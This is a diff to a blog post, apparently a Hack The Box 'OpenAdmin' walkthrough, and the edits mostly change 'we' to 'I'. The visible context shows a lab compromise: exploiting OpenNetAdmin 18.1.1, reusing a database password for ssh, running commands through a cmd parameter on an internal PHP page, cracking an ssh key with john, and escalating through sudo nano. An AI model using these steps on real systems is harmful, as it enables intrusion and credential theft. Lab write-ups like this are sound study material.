@@ -7,7 +7,7 @@ tags: [GtfoBins, Open Net Admin, Database, Php, Ssh, Cracking, John, Nano]
 image: /assets/img/Post/OpenAdmin.jpeg
 ---
 
->   **The information provided in this site is for educational purposes regarding pentesting. The author of the site will not be held any responsibility for any misuse of the information from this site.**
+>   **All information available on this site are for educational purposes only. Use these at your own discretion, the site owners cannot be held responsible for any damages caused.**
 
 
 ## **<span style='color:#ff5555'>Summary</span>**
@@ -47,11 +47,11 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 ```
 
-Only two ports are opened `22:ssh` and `80:http`. So we just need to focus on port `80`.
+Only two ports are opened `22:ssh` and `80:http`. So I just need to focus on port `80`.
 
 ## **<span style='color:#ff5555'>Port 80</span>**
 ***
-We try to visit the website on port `80`, we found `apache2 default page`.
+Visiting the site on port `80`, we found `apache2 default page`.
 
 ![]({{ "/images/htb/openadmin/defaultapache.png" | relative_url }})
 
@@ -78,7 +78,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /music (Status: 200)
 /artwork (Status: 200)
 ```
-I got two `directories` called music and network and found that `/ona` directory inside `/music` directory which mention the version of the portal. The title page is `OpenNetadmin` and the version is `18.1.1`.
+Found two `directories` called music and network and found that `/ona` directory inside `/music` directory which mention the version of the portal. The title page is `OpenNetadmin` and the version is `18.1.1`.
 
 ![]({{ "/images/htb/openadmin/onadir.png" | relative_url }})
 
@@ -91,7 +91,7 @@ There is exploit available for the current version on `exploit-db`.
 
 [OpenNetadmin-Exploit](https://www.exploit-db.com/exploits/47691)
 
-We just copy the `exploit` and modify it a bit.
+Copy the `exploit` and modify it a bit.
 
 ```
 #!/bin/bash
@@ -103,7 +103,8 @@ while true;do
 done
 ```
 
-Now its time to run the script.....
+Time to run the script
+
 
 ## **<span style='color:#ff5555'>www-data</span>**
 ***
@@ -150,7 +151,7 @@ $ona_contexts=array (
 );
 ```
 
-We have a password `n1nj4W4rri0R!`, maybe its for user, and also we found that there are two users in this machine.
+The password `n1nj4W4rri0R!`, maybe its for user, and also found that there are two users in this machine.
 
 ```
 $ ls -la /home
@@ -162,7 +163,7 @@ drwxr-x---  6 joanna joanna 4096 Nov 28 09:37 joanna
 $ 
 ```
 
-We try to ssh with user `jimmy` by loggin in to `ssh`.
+Try to ssh with user `jimmy` by loggin in to `ssh`.
 
 ```
 root@corshine:~# sshpass -p 'n1nj4W4rri0R!` jimmy@openadmin.htb
@@ -193,7 +194,7 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 Last login: Fri May  1 10:59:39 2020 from 10.10.16.81
 jimmy@openadmin:~$ 
 ```
-And we are as jimmy now but we can't find `user.txt`, after few minutes looking around, I found that I'm not in the proper user.
+And now logged in as jimmy but I can't find `user.txt`, after few minutes looking around, found that I'm not in the proper user.
 
 ## **<span style='color:#ff5555'>Escalating to Joanna</span>**
 ***
@@ -203,7 +204,7 @@ After various enumerations, I found a dir called `internal` in /var/www/ and the
 ```
 LISTEN             0                   128                                   127.0.0.1:52846  
 ```
-We tried to make a request to the `127.0.0.1:52846` using curl since it is already installed in the machine.
+Tried to make a request to the `127.0.0.1:52846` using curl since it is already installed in the machine.
 
 ```
 jimmy@openadmin:~$ curl 127.0.0.1:52846
@@ -325,7 +326,7 @@ jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/test.php?cmd=whoami
 
 <pre>joanna
 ```
-We confirmed that the service is running as user `joanna`
+I confirmed that the service is running as user `joanna`
 
 ## **<span style='color:#ff5555'>Grabbing the id_rsa</span>**
 ***
@@ -381,16 +382,16 @@ K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
 Click here to logout <a href="logout.php" tite = "Logout">Session
 </html>
 ```
-Now we have the encrypted `private ssh keys`.
+Now I have the encrypted `private ssh keys`.
 
 ## **<span style='color:#ff5555'>Crack the private-key</span>**
 ***
 
-First we have to make a crackable with john by using `ssh2john.py`
+First I have to make a crackable with john by using `ssh2john.py`
 ```
 root@corshine:~# python2 /usr/share/john/ssh2john.py joanna_rsa >> hash-id_rsa
 ```
-Now we can crack it with `john`
+Now I can crack it with `john`
 ```
 root@corshine:~# john hash-id_rsa -w=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -406,7 +407,7 @@ Warning: Only 2 candidates left, minimum 4 needed for performance.
 1g 0:00:00:07 DONE (2020-05-03 20:14) 0.1194g/s 1967Kp/s 1267Kc/s 1267KC/sa6_123..*7¡Vamos!
 Session completed
 ```
-We have `bloodninjas` as the cracked **passphrase**
+`bloodninjas` as the cracked **passphrase**
 
 Now it is time to login using the key of `joanna`
 ```
@@ -419,7 +420,7 @@ Last login: Fri May  1 11:31:30 2020 from 10.10.16.81
 joanna@openadmin:~$ 
 ```
 
-And we are in as `joanna`
+And I'm in as `joanna`
 
 ![]({{ "/images/htb/openadmin/usertxt.png" | relative_url }})
 
@@ -437,7 +438,7 @@ User joanna may run the following commands on openadmin:
     (ALL) NOPASSWD: /bin/nano /opt/priv
 ```
 
-We can edit the file on `/opt/priv` using nano as **root**.
+I can edit the file on `/opt/priv` using nano as **root**.
 
 I tried to search for `nano` on [GTFOBINS](https://gtfobins.github.io/gtfobins/nano/)
 
